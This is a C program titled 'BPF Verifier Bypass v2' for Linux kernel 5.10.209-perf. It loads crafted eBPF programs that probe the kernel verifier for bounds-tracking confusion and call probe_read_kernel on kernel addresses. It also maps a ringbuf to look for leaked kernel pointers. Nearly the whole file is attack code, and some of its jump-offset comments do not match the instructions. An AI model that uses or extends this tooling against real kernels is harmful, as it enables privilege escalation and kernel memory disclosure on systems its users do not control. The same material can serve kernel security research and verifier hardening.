/*
 * BPF Verifier Bypass v2 - Fixed Jump Offsets
 * Target: Kernel 5.10.209-perf
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static inline int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* BPF instruction macros */
#define BPF_LD_MAP_FD(DST, MAP_FD)                                                                                                 \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = BPF_PSEUDO_MAP_FD, .off = 0, .imm = MAP_FD}), \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_MOV64_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_MOV64_REG(DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_MOV32_IMM(DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_ALU64_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU64 | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_ALU64_REG(OP, DST, SRC) \
    ((struct bpf_insn){.code = BPF_ALU64 | (OP) | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})

#define BPF_ALU32_IMM(OP, DST, IMM) \
    ((struct bpf_insn){.code = BPF_ALU | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})

#define BPF_JMP_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_JMP32_IMM(OP, DST, IMM, OFF) \
    ((struct bpf_insn){.code = BPF_JMP32 | (OP) | BPF_K, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_STX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_STX | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF) \
    ((struct bpf_insn){.code = BPF_LDX | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = SRC, .off = OFF, .imm = 0})

#define BPF_ST_MEM(SIZE, DST, OFF, IMM) \
    ((struct bpf_insn){.code = BPF_ST | (SIZE) | BPF_MEM, .dst_reg = DST, .src_reg = 0, .off = OFF, .imm = IMM})

#define BPF_EXIT_INSN() \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})

#define BPF_CALL_FUNC(FUNC) \
    ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = FUNC})

#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_get_prandom_u32 7
#define BPF_FUNC_get_current_pid_tgid 14
#define BPF_FUNC_probe_read_kernel 113

static char verifier_log[65536];

int create_map(int type, int key_size, int val_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = val_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int load_prog(struct bpf_insn *insns, int insn_cnt, const char *name)
{
    memset(verifier_log, 0, sizeof(verifier_log));

    union bpf_attr attr = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insns = (unsigned long long)insns,
        .insn_cnt = insn_cnt,
        .license = (unsigned long long)"GPL",
        .log_level = 2,
        .log_size = sizeof(verifier_log),
        .log_buf = (unsigned long long)verifier_log,
    };

    int fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0)
    {
        printf("[%s] FAILED: %s\n", name, strerror(errno));
        /* Print only first 500 chars of log */
        if (strlen(verifier_log) > 0)
        {
            verifier_log[500] = 0;
            printf("Log: %s...\n", verifier_log);
        }
    }
    else
    {
        printf("[%s] SUCCESS: fd=%d\n", name, fd);
    }
    return fd;
}

/* Test 1: Simple valid program to verify BPF works */
int test_basic_valid(void)
{
    printf("\n[TEST 1] Basic Valid Program\n");
    printf("============================\n");

    struct bpf_insn insns[] = {
        BPF_MOV64_IMM(0, 0), /* r0 = 0 */
        BPF_EXIT_INSN(),     /* return r0 */
    };

    int fd = load_prog(insns, 2, "Basic");
    if (fd >= 0)
        close(fd);
    return fd >= 0 ? 0 : -1;
}

/* Test 2: Map access with proper NULL check */
int test_map_access(void)
{
    printf("\n[TEST 2] Map Access with NULL Check\n");
    printf("====================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 4);
    if (map_fd < 0)
    {
        printf("[-] Map creation failed\n");
        return -1;
    }
    printf("[+] Map fd=%d\n", map_fd);

    /* Instruction indices:
     * 0-1: BPF_LD_MAP_FD (2 insns)
     * 2: r1 = r10
     * 3: r1 += -4
     * 4: *(u32*)(r10-4) = 0
     * 5: r2 = r1
     * 6: r1 = r6
     * 7: call map_lookup
     * 8: if r0 == 0 goto +2 (to insn 11)
     * 9: r0 = *(u64*)(r0+0)
     * 10: exit
     * 11: r0 = 0
     * 12: exit
     */
    struct bpf_insn insns[] = {
        /* r6 = map_fd */
        BPF_LD_MAP_FD(6, map_fd), /* 0-1 */

        /* Prepare key on stack */
        BPF_MOV64_REG(1, 10),          /* 2 */
        BPF_ALU64_IMM(BPF_ADD, 1, -4), /* 3 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),  /* 4: key = 0 */
        BPF_MOV64_REG(2, 1),           /* 5: r2 = &key */
        BPF_MOV64_REG(1, 6),           /* 6: r1 = map */

        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), /* 7 */

        /* NULL check - if r0 == 0 goto exit */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 2), /* 8: if NULL, skip 2 */

        /* Read value */
        BPF_LDX_MEM(BPF_DW, 0, 0, 0), /* 9 */
        BPF_EXIT_INSN(),              /* 10 */

        /* NULL path */
        BPF_MOV64_IMM(0, 0), /* 11 */
        BPF_EXIT_INSN(),     /* 12 */
    };

    int fd = load_prog(insns, 13, "MapAccess");
    if (fd >= 0)
        close(fd);
    close(map_fd);
    return fd >= 0 ? 0 : -1;
}

/* Test 3: ALU32 bounds confusion attempt */
int test_alu32_bounds(void)
{
    printf("\n[TEST 3] ALU32 Bounds Confusion\n");
    printf("================================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 64, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),                /* 0-1 */
        BPF_MOV64_REG(1, 10),                    /* 2 */
        BPF_ALU64_IMM(BPF_ADD, 1, -4),           /* 3 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),            /* 4 */
        BPF_MOV64_REG(2, 1),                     /* 5 */
        BPF_MOV64_REG(1, 6),                     /* 6 */
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), /* 7 */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 12),          /* 8: NULL -> +12 to insn 21 */

        BPF_MOV64_REG(7, 0), /* 9: r7 = value ptr */

        /* Get random and mask to 32-bit */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32), /* 10 */
        BPF_MOV64_REG(8, 0),                     /* 11: r8 = random */

        /* 32-bit mask - clears upper 32 bits */
        BPF_ALU32_IMM(BPF_AND, 8, 0x3F), /* 12: w8 &= 63 */

        /* Bounds check */
        BPF_JMP_IMM(BPF_JGE, 8, 64, 5), /* 13: if r8 >= 64, goto exit */

        /* r8 is now provably [0, 63] */
        BPF_ALU64_REG(BPF_ADD, 7, 8), /* 14: r7 += r8 */

        /* Read single byte - should be within 64-byte buffer */
        BPF_LDX_MEM(BPF_B, 0, 7, 0), /* 15 */

        BPF_MOV64_IMM(0, 0), /* 16 */
        BPF_EXIT_INSN(),     /* 17 */

        /* OOB path */
        BPF_MOV64_IMM(0, 0), /* 18 */
        BPF_EXIT_INSN(),     /* 19 */

        /* 20: padding */
        BPF_MOV64_IMM(0, 0), /* 20 */

        /* NULL path */
        BPF_MOV64_IMM(0, 0), /* 21 */
        BPF_EXIT_INSN(),     /* 22 */
    };

    int fd = load_prog(insns, 23, "ALU32Bounds");
    if (fd >= 0)
    {
        printf("[+] ALU32 bounds program loaded successfully!\n");
        close(fd);
    }
    close(map_fd);
    return fd >= 0 ? 0 : -1;
}

/* Test 4: probe_read_kernel (if allowed) */
int test_probe_read(void)
{
    printf("\n[TEST 4] probe_read_kernel Test\n");
    printf("================================\n");

    /* This helper is typically not allowed in socket_filter */
    struct bpf_insn insns[] = {
        /* Setup buffer on stack */
        BPF_MOV64_REG(1, 10),                      /* 0: r1 = fp */
        BPF_ALU64_IMM(BPF_ADD, 1, -8),             /* 1: r1 = fp - 8 */
        BPF_MOV64_IMM(2, 8),                       /* 2: r2 = 8 (size) */
        BPF_MOV64_IMM(3, 0xFFFFFFC0),              /* 3: r3 = kernel addr (example) */
        BPF_ALU64_IMM(BPF_LSH, 3, 32),             /* 4: shift to make valid addr */
        BPF_CALL_FUNC(BPF_FUNC_probe_read_kernel), /* 5: call */
        BPF_MOV64_IMM(0, 0),                       /* 6 */
        BPF_EXIT_INSN(),                           /* 7 */
    };

    load_prog(insns, 8, "ProbeRead");
    return 0;
}

/* Test 5: JMP32 confusion with high bits */
int test_jmp32_high_bits(void)
{
    printf("\n[TEST 5] JMP32 High Bits Test\n");
    printf("==============================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 256, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),                /* 0-1 */
        BPF_MOV64_REG(1, 10),                    /* 2 */
        BPF_ALU64_IMM(BPF_ADD, 1, -4),           /* 3 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),            /* 4 */
        BPF_MOV64_REG(2, 1),                     /* 5 */
        BPF_MOV64_REG(1, 6),                     /* 6 */
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), /* 7 */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 11),          /* 8: NULL -> +11 to 20 */

        BPF_MOV64_REG(7, 0), /* 9: r7 = value ptr */

        /* Set up r8 with high bits set but low bits bounded */
        BPF_CALL_FUNC(BPF_FUNC_get_prandom_u32), /* 10 */
        BPF_MOV64_REG(8, 0),                     /* 11 */
        BPF_ALU32_IMM(BPF_AND, 8, 0xFF),         /* 12: w8 &= 0xFF (bounds 0-255) */

        /* 32-bit check passes */
        BPF_JMP32_IMM(BPF_JGT, 8, 255, 4), /* 13: if w8 > 255 goto exit */

        /* Should be safe */
        BPF_ALU64_REG(BPF_ADD, 7, 8), /* 14: ptr += r8 */
        BPF_LDX_MEM(BPF_B, 0, 7, 0),  /* 15: read byte */

        BPF_MOV64_IMM(0, 0), /* 16 */
        BPF_EXIT_INSN(),     /* 17 */

        BPF_MOV64_IMM(0, 0), /* 18 */
        BPF_EXIT_INSN(),     /* 19 */

        BPF_MOV64_IMM(0, 0), /* 20: NULL path */
        BPF_EXIT_INSN(),     /* 21 */
    };

    int fd = load_prog(insns, 22, "JMP32HighBits");
    if (fd >= 0)
        close(fd);
    close(map_fd);
    return fd >= 0 ? 0 : -1;
}

/* Test 6: Ringbuf access */
int test_ringbuf(void)
{
    printf("\n[TEST 6] Ringbuf Access\n");
    printf("========================\n");

    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_RINGBUF,
        .key_size = 0,
        .value_size = 0,
        .max_entries = 4096,
    };

    int rb_fd = bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
    if (rb_fd < 0)
    {
        printf("[-] Ringbuf creation failed: %s\n", strerror(errno));
        return -1;
    }
    printf("[+] Ringbuf fd=%d\n", rb_fd);

    /* Try to mmap */
    void *consumer = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                          MAP_SHARED, rb_fd, 0);
    if (consumer != MAP_FAILED)
    {
        printf("[+] Consumer page mapped at %p\n", consumer);

        /* Check for kernel pointers */
        unsigned long *data = (unsigned long *)consumer;
        printf("[*] First 8 values:\n");
        for (int i = 0; i < 8; i++)
        {
            printf("    [%d] = 0x%016lx\n", i, data[i]);
        }
        munmap(consumer, 4096);
    }

    close(rb_fd);
    return 0;
}

/* Test 7: Current PID/UID check (information disclosure) */
int test_pid_uid_info(void)
{
    printf("\n[TEST 7] PID/UID Information\n");
    printf("============================\n");

    int map_fd = create_map(BPF_MAP_TYPE_ARRAY, 4, 16, 1);
    if (map_fd < 0)
        return -1;

    struct bpf_insn insns[] = {
        BPF_LD_MAP_FD(6, map_fd),                /* 0-1 */
        BPF_MOV64_REG(1, 10),                    /* 2 */
        BPF_ALU64_IMM(BPF_ADD, 1, -4),           /* 3 */
        BPF_ST_MEM(BPF_W, 10, -4, 0),            /* 4 */
        BPF_MOV64_REG(2, 1),                     /* 5 */
        BPF_MOV64_REG(1, 6),                     /* 6 */
        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), /* 7 */
        BPF_JMP_IMM(BPF_JEQ, 0, 0, 8),           /* 8: NULL check */

        BPF_MOV64_REG(7, 0), /* 9: save ptr */

        /* Get PID/TGID */
        BPF_CALL_FUNC(BPF_FUNC_get_current_pid_tgid), /* 10 */
        BPF_STX_MEM(BPF_DW, 7, 0, 0),                 /* 11: store to map */

        BPF_MOV64_IMM(0, 0), /* 12 */
        BPF_EXIT_INSN(),     /* 13 */

        BPF_MOV64_IMM(0, 0), /* 14 */
        BPF_EXIT_INSN(),     /* 15 */

        BPF_MOV64_IMM(0, 0), /* 16: NULL */
        BPF_EXIT_INSN(),     /* 17 */
    };

    int fd = load_prog(insns, 18, "PidUidInfo");
    if (fd >= 0)
    {
        printf("[+] PID/UID program loaded!\n");
        close(fd);
    }
    close(map_fd);
    return fd >= 0 ? 0 : -1;
}

int main(void)
{
    printf("========================================\n");
    printf("BPF Verifier Bypass v2\n");
    printf("Kernel: 5.10.209-perf\n");
    printf("========================================\n");

    test_basic_valid();
    test_map_access();
    test_alu32_bounds();
    test_probe_read();
    test_jmp32_high_bits();
    test_ringbuf();
    test_pid_uid_info();

    printf("\n========================================\n");
    printf("Complete\n");
    printf("========================================\n");
    return 0;
}
